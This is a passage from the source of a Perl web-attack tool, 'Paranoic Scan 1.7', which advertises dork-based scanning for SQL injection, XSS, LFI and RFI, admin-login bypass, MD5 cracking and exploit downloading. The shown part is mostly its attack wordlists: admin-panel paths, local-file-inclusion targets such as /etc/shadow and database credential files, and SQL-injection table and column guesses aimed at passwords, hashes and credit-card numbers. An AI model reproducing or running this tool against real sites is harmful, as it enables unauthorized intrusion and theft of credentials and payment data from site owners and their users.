#!usr/bin/perl
#################################################################################
#This software is Copyright (c) 2014 by Doddy Hackman.
#
#This is free software, licensed under:
#
#  The Artistic License 1.0
#
#The Artistic License
#
#Preamble
#
#The intent of this document is to state the conditions under which a Package
#may be copied, such that the Copyright Holder maintains some semblance of
#artistic control over the development of the package, while giving the users of
#the package the right to use and distribute the Package in a more-or-less
#customary fashion, plus the right to make reasonable modifications.
#
#Definitions:
#
#  - "Package" refers to the collection of files distributed by the Copyright
#    Holder, and derivatives of that collection of files created through
#    textual modification.
#  - "Standard Version" refers to such a Package if it has not been modified,
#    or has been modified in accordance with the wishes of the Copyright
#    Holder.
#  - "Copyright Holder" is whoever is named in the copyright or copyrights for
#    the package.
#  - "You" is you, if you're thinking about copying or distributing this Package.
#  - "Reasonable copying fee" is whatever you can justify on the basis of media
#    cost, duplication charges, time of people involved, and so on. (You will
#    not be required to justify it to the Copyright Holder, but only to the
#    computing community at large as a market that must bear the fee.)
#  - "Freely Available" means that no fee is charged for the item itself, though
#    there may be fees involved in handling the item. It also means that
#    recipients of the item may redistribute it under the same conditions they
#    received it.
#
#1. You may make and give away verbatim copies of the source form of the
#Standard Version of this Package without restriction, provided that you
#duplicate all of the original copyright notices and associated disclaimers.
#
#2. You may apply bug fixes, portability fixes and other modifications derived
#from the Public Domain or from the Copyright Holder. A Package modified in such
#a way shall still be considered the Standard Version.
#
#3. You may otherwise modify your copy of this Package in any way, provided that
#you insert a prominent notice in each changed file stating how and when you
#changed that file, and provided that you do at least ONE of the following:
#
#  a) place your modifications in the Public Domain or otherwise make them
#     Freely Available, such as by posting said modifications to Usenet or an
#     equivalent medium, or placing the modifications on a major archive site
#     such as ftp.uu.net, or by allowing the Copyright Holder to include your
#     modifications in the Standard Version of the Package.
#
#  b) use the modified Package only within your corporation or organization.
#
#  c) rename any non-standard executables so the names do not conflict with
#     standard executables, which must also be provided, and provide a separate
#     manual page for each non-standard executable that clearly documents how it
#     differs from the Standard Version.
#
#  d) make other distribution arrangements with the Copyright Holder.
#
#4. You may distribute the programs of this Package in object code or executable
#form, provided that you do at least ONE of the following:
#
#  a) distribute a Standard Version of the executables and library files,
#     together with instructions (in the manual page or equivalent) on where to
#     get the Standard Version.
#
#  b) accompany the distribution with the machine-readable source of the Package
#     with your modifications.
#
#  c) accompany any non-standard executables with their corresponding Standard
#     Version executables, giving the non-standard executables non-standard
#     names, and clearly documenting the differences in manual pages (or
#     equivalent), together with instructions on where to get the Standard
#     Version.
#
#  d) make other distribution arrangements with the Copyright Holder.
#
#5. You may charge a reasonable copying fee for any distribution of this
#Package.  You may charge any fee you choose for support of this Package. You
#may not charge a fee for this Package itself. However, you may distribute this
#Package in aggregate with other (possibly commercial) programs as part of a
#larger (possibly commercial) software distribution provided that you do not
#advertise this Package as a product of your own.
#
#6. The scripts and library files supplied as input to or produced as output
#from the programs of this Package do not automatically fall under the copyright
#of this Package, but belong to whomever generated them, and may be sold
#commercially, and may be aggregated with this Package.
#
#7. C or perl subroutines supplied by you and linked into this Package shall not
#be considered part of this Package.
#
#8. The name of the Copyright Holder may not be used to endorse or promote
#products derived from this software without specific prior written permission.
#
#9. THIS PACKAGE IS PROVIDED "AS IS" AND WITHOUT ANY EXPRESS OR IMPLIED
#WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
#MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
#
#The End
#################################################################################
#Paranoic Scan 1.7
#(C) Doddy Hackman 2014
#Necessary modules
#http://search.cpan.org/~animator/Color-Output-1.05/Output.pm
#ppm install http://trouchelle.com/ppm/Color-Output.ppd
#http://search.cpan.org/~exiftool/Image-ExifTool-9.27/lib/Image/ExifTool.pod
#http://search.cpan.org/~timb/DBI-1.630/DBI.pm
#http://search.cpan.org/~capttofu/DBD-mysql-4.025/lib/DBD/mysql.pm
#The arrays are a collection of several I found on the web
#
#[++] Old Options
#
#Google & Bing Scanner that also scan :
#
# * XSS
# * SQL GET / POST
# * SQL GET
# * SQL GET + Admin
# * Directory listing
# * MSSQL
# * Jet Database
# * Oracle
# * LFI
# * RFI
# * Full Source Discloure
# * HTTP Information
# * SQLi Scanner
# * Bypass Admin
# * Exploit FSD Manager
# * Paths Finder
# * Locate IP
# * Crack MD5
# * Panel Finder
# * Console
#
#[++] Fixes
#
#[+] Refresh of existing pages to crack md5
#[+] Error scanner fsd
#[+] Http error scanner scan
#[+] Spaces between text too annoying
#[+] Added array to bypass
#[+] Failed to read from file
#
#[++] New options
#
#[+] Generate all logs in a html file
#[+] Incorporates random and new useragent
#[+] Multi encoder / decoder :
#
# * Ascii
# * Hex
# * Url
# * Bin To Text & Text To Bin
#
#[+] PortScanner
#[+] HTTP FingerPrinting
#[+] CSRF Tool
#[+] Scan XSS
#[+] Generator for XSS Bypass
#[+] Generator tiny url links to
#[+] Finder and downloader exploits on Exploit-DB
#[+] Mysql Manager
#[+] Tools LFI
#
#################################################################################

use Color::Output;
Color::Output::Init;
use LWP::UserAgent;
use URI::Escape;
use IO::Socket;
use URI::Split qw(uri_split);
use File::Basename;
use HTML::Form;
use HTML::Parser;
use HTML::LinkExtor;
use HTML::Form;
use Time::HiRes "usleep";
use Image::ExifTool;
use Digest::MD5 qw(md5_hex);
use MIME::Base64;
use DBI;
use Cwd;

$|++;

##

##Arrays

my @agents = (
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
'Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0'
);

my @paneles = (
    'admin/admin.asp',               'admin/login.asp',
    'admin/index.asp',               'admin/admin.aspx',
    'admin/login.aspx',              'admin/index.aspx',
    'admin/webmaster.asp',           'admin/webmaster.aspx',
    'asp/admin/index.asp',           'asp/admin/index.aspx',
    'asp/admin/admin.asp',           'asp/admin/admin.aspx',
    'asp/admin/webmaster.asp',       'asp/admin/webmaster.aspx',
    'admin/',                        'login.asp',
    'login.aspx',                    'admin.asp',
    'admin.aspx',                    'webmaster.aspx',
    'webmaster.asp',                 'login/index.asp',
    'login/index.aspx',              'login/login.asp',
    'login/login.aspx',              'login/admin.asp',
    'login/admin.aspx',              'administracion/index.asp',
    'administracion/index.aspx',     'administracion/login.asp',
    'administracion/login.aspx',     'administracion/webmaster.asp',
    'administracion/webmaster.aspx', 'administracion/admin.asp',
    'administracion/admin.aspx',     'php/admin/',
    'admin/admin.php',               'admin/index.php',
    'admin/login.php',               'admin/system.php',
    'admin/ingresar.php',            'admin/administrador.php',
    'admin/default.php',             'administracion/',
    'administracion/index.php',      'administracion/login.php',
    'administracion/ingresar.php',   'administracion/admin.php',
    'administration/',               'administration/index.php',
    'administration/login.php',      'administrator/index.php',
    'administrator/login.php',       'administrator/system.php',
    'system/',                       'system/login.php',
    'admin.php',                     'login.php',
    'administrador.php',             'administration.php',
    'administrator.php',             'admin1.html',
    'admin1.php',                    'admin2.php',
    'admin2.html',                   'yonetim.php',
    'yonetim.html',                  'yonetici.php',
    'yonetici.html',                 'adm/',
    'admin/account.php',             'admin/account.html',
    'admin/index.html',              'admin/login.html',
    'admin/home.php',                'admin/controlpanel.html',
    'admin/controlpanel.php',        'admin.html',
    'admin/cp.php',                  'admin/cp.html',
    'cp.php',                        'cp.html',
    'administrator/',                'administrator/index.html',
    'administrator/login.html',      'administrator/account.html',
    'administrator/account.php',     'administrator.html',
    'login.html',                    'modelsearch/login.php',
    'moderator.php',                 'moderator.html',
    'moderator/login.php',           'moderator/login.html',
    'moderator/admin.php',           'moderator/admin.html',
    'moderator/',                    'account.php',
    'account.html',                  'controlpanel/',
    'controlpanel.php',              'controlpanel.html',
    'admincontrol.php',              'admincontrol.html',
    'adminpanel.php',                'adminpanel.html',
    'admin1.asp',                    'admin2.asp',
    'yonetim.asp',                   'yonetici.asp',
    'admin/account.asp',             'admin/home.asp',
    'admin/controlpanel.asp',        'admin/cp.asp',
    'cp.asp',                        'administrator/index.asp',
    'administrator/login.asp',       'administrator/account.asp',
    'administrator.asp',             'modelsearch/login.asp',
    'moderator.asp',                 'moderator/login.asp',
    'moderator/admin.asp',           'account.asp',
    'controlpanel.asp',              'admincontrol.asp',
    'adminpanel.asp',                'fileadmin/',
    'fileadmin.php',                 'fileadmin.asp',
    'fileadmin.html',                'administration.html',
    'sysadmin.php',                  'sysadmin.html',
    'phpmyadmin/',                   'myadmin/',
    'sysadmin.asp',                  'sysadmin/',
    'ur-admin.asp',                  'ur-admin.php',
    'ur-admin.html',                 'ur-admin/',
    'Server.php',                    'Server.html',
    'Server.asp',                    'Server/',
    'wp-admin/',                     'administr8.php',
    'administr8.html',               'administr8/',
    'administr8.asp',                'webadmin/',
    'webadmin.php',                  'webadmin.asp',
    'webadmin.html',                 'administratie/',
    'admins/',                       'admins.php',
    'admins.asp',                    'admins.html',
    'administrivia/',                'Database_Administration/',
    'WebAdmin/',                     'useradmin/',
    'sysadmins/',                    'admin1/',
    'system-administration/',        'administrators/',
    'pgadmin/',                      'directadmin/',
    'staradmin/',                    'ServerAdministrator/',
    'SysAdmin/',                     'administer/',
    'LiveUser_Admin/',               'sys-admin/',
    'typo3/',                        'panel/',
    'cpanel/',                       'cPanel/',
    'cpanel_file/',                  'platz_login/',
    'rcLogin/',                      'blogindex/',
    'formslogin/',                   'autologin/',
    'support_login/',                'meta_login/',
    'manuallogin/',                  'simpleLogin/',
    'loginflat/',                    'utility_login/',
    'showlogin/',                    'memlogin/',
    'members/',                      'login-redirect/',
    'sub-login/',                    'wp-login/',
    'login1/',                       'dir-login/',
    'login_db/',                     'xlogin/',
    'smblogin/',                     'customer_login/',
    'UserLogin/',                    'login-us/',
    'acct_login/',                   'admin_area/',
    'bigadmin/',                     'project-admins/',
    'phppgadmin/',                   'pureadmin/',
    'sql-admin/',                    'radmind/',
    'openvpnadmin/',                 'wizmysqladmin/',
    'vadmind/',                      'ezsqliteadmin/',
    'hpwebjetadmin/',                'newsadmin/',
    'adminpro/',                     'Lotus_Domino_Admin/',
    'bbadmin/',                      'vmailadmin/',
    'Indy_admin/',                   'ccp14admin/',
    'irc-macadmin/',                 'banneradmin/',
    'sshadmin/',                     'phpldapadmin/',
    'macadmin/',                     'administratoraccounts/',
    'admin4_account/',               'admin4_colon/',
    'radmind-1/',                    'Super-Admin/',
    'AdminTools/',                   'cmsadmin/',
    'SysAdmin2/',                    'globes_admin/',
    'cadmins/',                      'phpSQLiteAdmin/',
    'navSiteAdmin/',                 'server_admin_small/',
    'logo_sysadmin/',                'server/',
    'database_administration/',      'power_user/',
    'system_administration/',        'ss_vms_admin_sm/'
);

#my @files = ("/opt/lampp/htdocs/fofo.txt","/opt/lampp/htdocs/fofo.txt");

my @files = (
    'C:/xampp/htdocs/aca.txt',
    '../lfi.php',
    'C:/xampp/htdocs/admin.php',
    'C:/xampp/htdocs/leer.txt',
    '../../../boot.ini',
    '../../../../boot.ini',
    '../../../../../boot.ini',
    '../../../../../../boot.ini',
    '/etc/passwd',
    '/etc/shadow',
    '/etc/shadow~',
    '/etc/hosts',
    '/etc/motd',
    '/etc/apache/apache.conf',
    '/etc/fstab',
    '/etc/apache2/apache2.conf',
    '/etc/apache/httpd.conf',
    '/etc/httpd/conf/httpd.conf',
    '/etc/apache2/httpd.conf',
    '/etc/apache2/sites-available/default',
    '/etc/mysql/my.cnf',
    '/etc/my.cnf',
    '/etc/sysconfig/network-scripts/ifcfg-eth0',
    '/etc/redhat-release',
    '/etc/httpd/conf.d/php.conf',
    '/etc/pam.d/proftpd',
    '/etc/phpmyadmin/config.inc.php',
    '/var/www/config.php',
    '/etc/httpd/logs/error_log',
    '/etc/httpd/logs/error.log',
    '/etc/httpd/logs/access_log',
    '/etc/httpd/logs/access.log',
    '/var/log/apache/error_log',
    '/var/log/apache/error.log',
    '/var/log/apache/access_log',
    '/var/log/apache/access.log',
    '/var/log/apache2/error_log',
    '/var/log/apache2/error.log',
    '/var/log/apache2/access_log',
    '/var/log/apache2/access.log',
    '/var/www/logs/error_log',
    '/var/www/logs/error.log',
    '/var/www/logs/access_log',
    '/var/www/logs/access.log',
    '/usr/local/apache/logs/error_log',
    '/usr/local/apache/logs/error.log',
    '/usr/local/apache/logs/access_log',
    '/usr/local/apache/logs/access.log',
    '/var/log/error_log',
    '/var/log/error.log',
    '/var/log/access_log',
    '/var/log/access.log',
    '/etc/group',
    '/etc/security/group',
    '/etc/security/passwd',
    '/etc/security/user',
    '/etc/security/environ',
    '/etc/security/limits',
    '/usr/lib/security/mkuser.default',
    '/apache/logs/access.log',
    '/apache/logs/error.log',
    '/etc/httpd/logs/acces_log',
    '/etc/httpd/logs/acces.log',
    '/var/log/httpd/access_log',
    '/var/log/httpd/error_log',
    '/apache2/logs/error.log',
    '/apache2/logs/access.log',
    '/logs/error.log',
    '/logs/access.log',
    '/usr/local/apache2/logs/access_log',
    '/usr/local/apache2/logs/access.log',
    '/usr/local/apache2/logs/error_log',
    '/usr/local/apache2/logs/error.log',
    '/var/log/httpd/access.log',
    '/var/log/httpd/error.log',
    '/opt/lampp/logs/access_log',
    '/opt/lampp/logs/error_log',
    '/opt/xampp/logs/access_log',
    '/opt/xampp/logs/error_log',
    '/opt/lampp/logs/access.log',
    '/opt/lampp/logs/error.log',
    '/opt/xampp/logs/access.log',
    '/opt/xampp/logs/error.log',
    'C:\ProgramFiles\ApacheGroup\Apache\logs\access.log',
    'C:\ProgramFiles\ApacheGroup\Apache\logs\error.log',
    '/usr/local/apache/conf/httpd.conf',
    '/usr/local/apache2/conf/httpd.conf',
    '/etc/apache/conf/httpd.conf',
    '/usr/local/etc/apache/conf/httpd.conf',
    '/usr/local/apache/httpd.conf',
    '/usr/local/apache2/httpd.conf',
    '/usr/local/httpd/conf/httpd.conf',
    '/usr/local/etc/apache2/conf/httpd.conf',
    '/usr/local/etc/httpd/conf/httpd.conf',
    '/usr/apache2/conf/httpd.conf',
    '/usr/apache/conf/httpd.conf',
    '/usr/local/apps/apache2/conf/httpd.conf',
    '/usr/local/apps/apache/conf/httpd.conf',
    '/etc/apache2/conf/httpd.conf',
    '/etc/http/conf/httpd.conf',
    '/etc/httpd/httpd.conf',
    '/etc/http/httpd.conf',
    '/etc/httpd.conf',
    '/opt/apache/conf/httpd.conf',
    '/opt/apache2/conf/httpd.conf',
    '/var/www/conf/httpd.conf',
    '/private/etc/httpd/httpd.conf',
    '/private/etc/httpd/httpd.conf.default',
    '/Volumes/webBackup/opt/apache2/conf/httpd.conf',
    '/Volumes/webBackup/private/etc/httpd/httpd.conf',
    '/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
    'C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf',
    'C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf',
    'C:\ProgramFiles\xampp\apache\conf\httpd.conf',
    '/usr/local/php/httpd.conf.php',
    '/usr/local/php4/httpd.conf.php',
    '/usr/local/php5/httpd.conf.php',
    '/usr/local/php/httpd.conf',
    '/usr/local/php4/httpd.conf',
    '/usr/local/php5/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php',
    '/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php',
    '/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php',
    '/usr/local/etc/apache/vhosts.conf',
    '/etc/php.ini',
    '/bin/php.ini',
    '/etc/httpd/php.ini',
    '/usr/lib/php.ini',
    '/usr/lib/php/php.ini',
    '/usr/local/etc/php.ini',
    '/usr/local/lib/php.ini',
    '/usr/local/php/lib/php.ini',
    '/usr/local/php4/lib/php.ini',
    '/usr/local/php5/lib/php.ini',
    '/usr/local/apache/conf/php.ini',
    '/etc/php4.4/fcgi/php.ini',
    '/etc/php4/apache/php.ini',
    '/etc/php4/apache2/php.ini',
    '/etc/php5/apache/php.ini',
    '/etc/php5/apache2/php.ini',
    '/etc/php/php.ini',
    '/etc/php/php4/php.ini',
    '/etc/php/apache/php.ini',
    '/etc/php/apache2/php.ini',
    '/web/conf/php.ini',
    '/usr/local/Zend/etc/php.ini',
    '/opt/xampp/etc/php.ini',
    '/var/local/www/conf/php.ini',
    '/etc/php/cgi/php.ini',
    '/etc/php4/cgi/php.ini',
    '/etc/php5/cgi/php.ini',
    'c:\php5\php.ini',
    'c:\php4\php.ini',
    'c:\php\php.ini',
    'c:\PHP\php.ini',
    'c:\WINDOWS\php.ini',
    'c:\WINNT\php.ini',
    'c:\apache\php\php.ini',
    'c:\xampp\apache\bin\php.ini',
    'c:\NetServer\bin\stable\apache\php.ini',
    'c:\home2\bin\stable\apache\php.ini',
    'c:\home\bin\stable\apache\php.ini',
    '/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini',
    '/usr/local/cpanel/logs',
    '/usr/local/cpanel/logs/stats_log',
    '/usr/local/cpanel/logs/access_log',
    '/usr/local/cpanel/logs/error_log',
    '/usr/local/cpanel/logs/license_log',
    '/usr/local/cpanel/logs/login_log',
    '/var/cpanel/cpanel.config',
    '/var/log/mysql/mysql-bin.log',
    '/var/log/mysql.log',
    '/var/log/mysqlderror.log',
    '/var/log/mysql/mysql.log',
    '/var/log/mysql/mysql-slow.log',
    '/var/mysql.log',
    '/var/lib/mysql/my.cnf',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\hostname.err',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.log',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.err',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql-bin.log',
    'C:\ProgramFiles\MySQL\data\hostname.err',
    'C:\ProgramFiles\MySQL\data\mysql.log',
    'C:\ProgramFiles\MySQL\data\mysql.err',
    'C:\ProgramFiles\MySQL\data\mysql-bin.log',
    'C:\MySQL\data\hostname.err',
    'C:\MySQL\data\mysql.log',
    'C:\MySQL\data\mysql.err',
    'C:\MySQL\data\mysql-bin.log',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\my.ini',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\my.cnf',
    'C:\ProgramFiles\MySQL\my.ini',
    'C:\ProgramFiles\MySQL\my.cnf',
    'C:\MySQL\my.ini',
    'C:\MySQL\my.cnf',
    '/etc/logrotate.d/proftpd',
    '/www/logs/proftpd.system.log',
    '/var/log/proftpd',
    '/etc/proftp.conf',
    '/etc/protpd/proftpd.conf',
    '/etc/vhcs2/proftpd/proftpd.conf',
    '/etc/proftpd/modules.conf',
    '/var/log/vsftpd.log',
    '/etc/vsftpd.chroot_list',
    '/etc/logrotate.d/vsftpd.log',
    '/etc/vsftpd/vsftpd.conf',
    '/etc/vsftpd.conf',
    '/etc/chrootUsers',
    '/var/log/xferlog',
    '/var/adm/log/xferlog',
    '/etc/wu-ftpd/ftpaccess',
    '/etc/wu-ftpd/ftphosts',
    '/etc/wu-ftpd/ftpusers',
    '/usr/sbin/pure-config.pl',
    '/usr/etc/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.conf',
    '/usr/local/etc/pure-ftpd.conf',
    '/usr/local/etc/pureftpd.pdb',
    '/usr/local/pureftpd/etc/pureftpd.pdb',
    '/usr/local/pureftpd/sbin/pure-config.pl',
    '/usr/local/pureftpd/etc/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.pdb',
    '/etc/pureftpd.pdb',
    '/etc/pureftpd.passwd',
    '/etc/pure-ftpd/pureftpd.pdb',
    '/var/log/pure-ftpd/pure-ftpd.log',
    '/logs/pure-ftpd.log',
    '/var/log/pureftpd.log',
    '/var/log/ftp-proxy/ftp-proxy.log',
    '/var/log/ftp-proxy',
    '/var/log/ftplog',
    '/etc/logrotate.d/ftp',
    '/etc/ftpchroot',
    '/etc/ftphosts',
    '/var/log/exim_mainlog',
    '/var/log/exim/mainlog',
    '/var/log/maillog',
    '/var/log/exim_paniclog',
    '/var/log/exim/paniclog',
    '/var/log/exim/rejectlog',
    '/var/log/exim_rejectlog'
);
my @buscar1 = (
    'usuario',                 'web_users',
    'name',                    'names',
    'nombre',                  'nombres',
    'usuarios',                'member',
    'members',                 'admin_table',
    'usuaris',                 'admin',
    'tblUsers',                'tblAdmin',
    'user',                    'users',
    'username',                'usernames',
    'web_usuarios',            'miembro',
    'miembros',                'membername',
    'admins',                  'administrator',
    'sign',                    'config',
    'USUARIS',                 'cms_operadores',
    'administrators',          'passwd',
    'password',                'passwords',
    'pass',                    'Pass',
    'mpn_authors',             'author',
    'musuario',                'mysql.user',
    'user_names',              'foro',
    'tAdmin',                  'tadmin',
    'user_password',           'user_passwords',
    'user_name',               'member_password',
    'mods',                    'mod',
    'moderators',              'moderator',
    'user_email',              'jos_users',
    'mb_user',                 'host',
    'apellido_nombre',         'user_emails',
    'user_mail',               'user_mails',
    'mail',                    'emails',
    'email',                   'address',
    'jos_usuarios',            'tutorial_user_auth',
    'e-mail',                  'emailaddress',
    'correo',                  'correos',
    'phpbb_users',             'log',
    'logins',                  'login',
    'tbl_usuarios',            'user_auth',
    'login_radio',             'registers',
    'register',                'usr',
    'usrs',                    'ps',
    'pw',                      'un',
    'u_name',                  'u_pass',
    'tbl_admin',               'usuarios_head',
    'tpassword',               'tPassword',
    'u_password',              'nick',
    'nicks',                   'manager',
    'managers',                'administrador',
    'BG_CMS_Users',            'tUser',
    'tUsers',                  'administradores',
    'clave',                   'login_id',
    'pwd',                     'pas',
    'sistema_id',              'foro_usuarios',
    'cliente',                 'sistema_usuario',
    'sistema_password',        'contrasena',
    'auth',                    'key',
    'senha',                   'signin',
    'dir_admin',               'alias',
    'clientes',                'tb_admin',
    'tb_administrator',        'tb_login',
    'tb_logon',                'tb_members_tb_member',
    'calendar_users',          'cursos',
    'tb_users',                'tb_user',
    'tb_sys',                  'sys',
    'fazerlogon',              'logon',
    'fazer',                   'authorization',
    'curso',                   'membros',
    'utilizadores',            'staff',
    'nuke_authors',            'accounts',
    'account',                 'accnts',
    'signup',                  'leads',
    'lead',                    'associated',
    'accnt',                   'customers',
    'customer',                'membres',
    'administrateur',          'utilisateur',
    'riacms_users',            'tuser',
    'tusers',                  'utilisateurs',
    'amministratore',          'god',
    'God',                     'authors',
    'wp_users',                'tb_usuarios',
    'asociado',                'asociados',
    'autores',                 'autor',
    'Users',                   'Admin',
    'Members',                 'tb_usuario',
    'Miembros',                'Usuario',
    'Usuarios',                'ADMIN',
    'USERS',                   'USER',
    'MEMBER',                  'MEMBERS',
    'USUARIO',                 'USUARIOS',
    'MIEMBROS',                'MIEMBRO',
    'USR_NAME',                'about',
    'access',                  'admin_id',
    'admin_name',              'admin_pass',
    'admin_passwd',            'admin_password',
    'admin_pwd',               'admin_user',
    'admin_userid',            'admin_username',
    'adminemail',              'adminid',
    'administrator_name',      'adminlogin',
    'adminmail',               'adminname',
    'adminuser',               'adminuserid',
    'adminusername',           'aid',
    'aim',                     'apwd',
    'auid',                    'authenticate',
    'authentication',          'blog',
    'cc_expires',              'cc_number',
    'cc_owner',                'cc_type',
    'cfg',                     'cid',
    'clientname',              'clientpassword',
    'clientusername',          'conf',
    'contact',                 'converge_pass_hash',
    'converge_pass_salt',      'crack',
    'customers_email_address', 'customers_password',
    'cvvnumber]',              'data',
    'db_database_name',        'db_hostname',
    'db_password',             'db_username',
    'download',                'e_mail',
    'emer',                    'emni',
    'emniplote',               'emri',
    'fjalekalimi',             'fjalekalimin',
    'full',                    'gid',
    'group',                   'group_name',
    'hash',                    'hashsalt',
    'homepage',                'icq',
    'icq_number',              'id',
    'id_group',                'id_member',
    'images',                  'ime',
    'index',                   'ip_address',
    'kodi',                    'korisnici',
    'korisnik',                'kpro_user',
    'last_ip',                 'last_login',
    'lastname',                'llogaria',
    'login_admin',             'login_name',
    'login_pass',              'login_passwd',
    'login_password',          'login_pw',
    'login_pwd',               'login_user',
    'login_username',          'logini',
    'loginkey',                'loginout',
    'logo',                    'logohu',
    'lozinka',                 'md5hash',
    'mem_login',               'mem_pass',
    'mem_passwd',              'mem_password',
    'mem_pwd',                 'member_id',
    'member_login_key',        'member_name',
    'memberid',                'memlogin',
    'mempassword',             'my_email',
    'my_name',                 'my_password',
    'my_username',             'myname',
    'mypassword',              'myusername',
    'nc',                      'new',
    'news',                    'number',
    'nummer',                  'p_assword',
    'p_word',                  'pass_hash',
    'pass_w',                  'pass_word',
    'pass1word',               'passw',
    'passwordsalt',            'passwort',
    'passwrd',                 'perdorimi',
    'perdoruesi',              'personal_key',
    'phone',                   'privacy',
    'psw',                     'punetoret',
    'punonjes',                'pword',
    'pwrd',                    'salt',
    'search',                  'secretanswer',
    'search',                  'secretanswer',
    'secretquestion',          'serial',
    'session_member_id',       'session_member_login_key',
    'sesskey',                 'setting',
    'sid',                     'sifra',
    'spacer',                  'status',
    'store',                   'store1',
    'store2',                  'store3',
    'store4',                  'table_prefix',
    'temp_pass',               'temp_password',
    'temppass',                'temppasword',
    'text',                    'uid',
    'uname',                   'user_admin',
    'user_icq',                'user_id',
    'user_ip',                 'user_level',
    'user_login',              'user_n',
    'user_pass',               'user_passw',
    'user_passwd',             'user_pw',
    'user_pwd',                'user_pword',
    'user_pwrd',               'user_un',
    'user_uname',              'user_username',
    'user_usernm',             'user_usernun',
    'user_usrnm',              'user1',
    'useradmin',               'userid',
    'userip',                  'userlogin',
    'usern',                   'usernm',
    'userpass',                'userpassword',
    'userpw',                  'userpwd',
    'usr_n',                   'usr_name',
    'usr_pass',                'usr2',
    'usrn',                    'usrnam',
    'usrname',                 'usrnm',
    'usrpass',                 'warez',
    'xar_name',                'xar_pass',
    'nom dutilisateur',        'mot de passe',
    'compte',                  'comptes',
    'aide',                    'objectif',
    'authentifier',            'authentification',
    'Contact',                 'fissure',
    'client',                  'clients',
    'de donn?es',              'mot_de_passe_bdd',
    't?l?charger',             'E-mail',
    'adresse e-mail',          'Emer',
    'complet',                 'groupe',
    'hachage',                 'Page daccueil',
    'Kodi',                    'nom',
    'connexion',               'membre',
    'MEMBERNAME',              'mon_mot_de_passe',
    'monmotdepasse',           'ignatiusj',
    'caroline-du-nord',        'nouveau',
    'Nick',                    'passer',
    'Passw',                   'Mot de passe',
    't?l?phone',               'protection de la vie priv?e',
    'PSW',                     'pWord',
    'sel',                     'recherche',
    'de s?rie',                'param?tre',
    '?tat',                    'stocker',
    'texte',                   'cvvnumber'
);
my @buscar2 = (
    'name',                          'user',
    'user_name',                     'user_username',
    'uname',                         'user_uname',
    'usern',                         'user_usern',
    'un',                            'user_un',
    'mail',                          'cliente',
    'usrnm',                         'user_usrnm',
    'usr',                           'admin_name',
    'cla_adm',                       'usu_adm',
    'fazer',                         'logon',
    'fazerlogon',                    'authorization',
    'membros',                       'utilizadores',
    'sysadmin',                      'email',
    'senha',                         'username',
    'usernm',                        'user_usernm',
    'nm',                            'user_nm',
    'login',                         'u_name',
    'nombre',                        'host',
    'pws',                           'cedula',
    'userName',                      'host_password',
    'chave',                         'alias',
    'apellido_nombre',               'cliente_nombre',
    'cliente_email',                 'cliente_pass',
    'cliente_user',                  'cliente_usuario',
    'login_id',                      'sistema_id',
    'author',                        'user_login',
    'admin_user',                    'admin_pass',
    'uh_usuario',                    'uh_password',
    'psw',                           'host_username',
    'sistema_usuario',               'auth',
    'key',                           'usuarios_nombre',
    'usuarios_nick',                 'usuarios_password',
    'user_clave',                    'membername',
    'nme',                           'unme',
    'password',                      'user_password',
    'autores',                       'pass_hash',
    'hash',                          'pass',
    'correo',                        'usuario_nombre',
    'usuario_nick',                  'usuario_password',
    'userpass',                      'user_pass',
    'upw',                           'pword',
    'user_pword',                    'passwd',
    'user_passwd',                   'passw',
    'user_passw',                    'pwrd',
    'user_pwrd',                     'pwd',
    'authors',                       'user_pwd',
    'u_pass',                        'clave',
    'usuario',                       'contrasena',
    'pas',                           'sistema_password',
    'autor',                         'upassword',
    'web_password',                  'web_username',
    'tbladmins',                     'sort',
    '_wfspro_admin',                 '4images_users',
    'a_admin',                       'account',
    'accounts',                      'adm',
    'admin',                         'admin_login',
    'admin_userinfo',                'administer',
    'administrable',                 'administrate',
    'administration',                'administrator',
    'administrators',                'adminrights',
    'admins',                        'adminuser',
    'art',                           'article_admin',
    'articles',                      'artikel',
    'ÃÜÂë',                      'aut',
    'autore',                        'backend',
    'backend_users',                 'backenduser',
    'bbs',                           'book',
    'chat_config',                   'chat_messages',
    'chat_users',                    'client',
    'clients',                       'clubconfig',
    'company',                       'config',
    'contact',                       'contacts',
    'content',                       'control',
    'cpg_config',                    'cpg132_users',
    'customer',                      'customers',
    'customers_basket',              'dbadmins',
    'dealer',                        'dealers',
    'diary',                         'download',
    'Dragon_users',                  'e107.e107_user',
    'e107_user',                     'forum.ibf_members',
    'fusion_user_groups',            'fusion_users',
    'group',                         'groups',
    'ibf_admin_sessions',            'ibf_conf_settings',
    'ibf_members',                   'ibf_members_converge',
    'ibf_sessions',                  'icq',
    'images',                        'index',
    'info',                          'ipb.ibf_members',
    'ipb_sessions',                  'joomla_users',
    'jos_blastchatc_users',          'jos_comprofiler_members',
    'jos_contact_details',           'jos_joomblog_users',
    'jos_messages_cfg',              'jos_moschat_users',
    'jos_users',                     'knews_lostpass',
